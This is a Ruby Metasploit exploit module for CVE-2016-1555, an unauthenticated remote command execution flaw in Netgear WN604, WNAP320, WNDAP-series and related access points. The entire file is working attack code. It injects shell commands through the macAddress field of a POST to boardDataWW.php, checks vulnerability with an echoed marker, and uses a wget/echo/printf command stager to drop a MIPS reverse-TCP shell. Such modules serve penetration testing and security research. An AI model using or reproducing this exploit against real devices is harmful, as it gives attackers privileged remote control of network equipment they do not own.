##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  #include Msf::Exploit::Remote::HttpServer
  #include Msf::Exploit::EXE
  #include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Netgear Devices Unauthenticated Remote Command Execution',
      'Description' => %q{
        From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,
        (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in
        Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,
        WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute
        arbitrary commands.
      },
      'Author'      =>
        [
          'Daming Dominic Chen <ddchen[at]cs.cmu.edu>', # Vuln discovery
          'Imran Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # MSF module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2016-1555'],
          ['URL', 'https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic'],
          ['PACKETSTORM', '135956'],
          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/112']
        ],
      'DisclosureDate' => 'Feb 25 2016', # According to http://seclists.org/fulldisclosure/2016/Feb/112
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'           => ARCH_MIPSBE,
      'Payload'        => {},
      'DefaultOptions' => {
        'CMDSTAGER::FLAVOR' => 'wget',
        'PAYLOAD'           => 'linux/mipsbe/shell_reverse_tcp',
        #'VULN_URI'          => 'boardDataWW.php', 
        'WfsDelay'          => 5 },
      'Targets'        => [[ 'Automatic',	{ }]],
      'CmdStagerFlavor'=> %w{ echo printf wget },
      'DefaultTarget'  => 0
      ))
  end

  def filter_bad_chars(cmd)
    cmd.gsub!(/chmod \+x/, 'chmod 777')
    cmd.gsub!(/;/, ' %26%26 ')
    cmd.gsub!(/ /, '+')
  end

  # post request
  def request_post(command)
    begin
      send_request_cgi({
        'method'  => 'POST',
        'headers' => { 'Connection' => 'Keep-Alive' },
        'uri'     => 'boardDataWW.php', # ARRRRRRGH, the worldwide one should be present everywhere
        'query'   => Rex::Text.uri_encode(command, 'hex-all'),
        'data'    => "macAddress=000000000000;#{filter_bad_chars(command)};&reginfo=1&writeData=Submit\r\n"
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  # check for vulnerability existence
  def check
    vuln_check_param = "echo DEADBEEF31337" # if vulnerability is present, we will get this back in the response
    raw_response_post = request_post(vuln_check_param) # the raw POST response
    response_body = raw_response_post.get_html_document # the body of the POST response
    vuln_or_not = response_body.at('input[@value="000000000000;echo DEADBEEF31337;"]').to_s # if vulnerable, everything in the input field should be in here, including DEADBEEF31337

    if raw_response_post && raw_response_post.code == 200 # detected
      if vuln_or_not.include? "DEADBEEF31337" # undeniably vulnerable
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Detected
      end
    end
  end

  def execute_command(cmd, opts = {})
      print_status("Sending stager...") # debug purposes
      request_post(cmd)
  end

  # the exploit method
  def exploit
    print_status("#{peer} - Connecting to target") # debug purposes
    #run a check before attempting to exploit
    unless [CheckCode::Vulnerable].include? check
        fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
    end
    print_status("check ran its course, carrying out exploit...") # debug purposes
    execute_cmdstager
  end

end
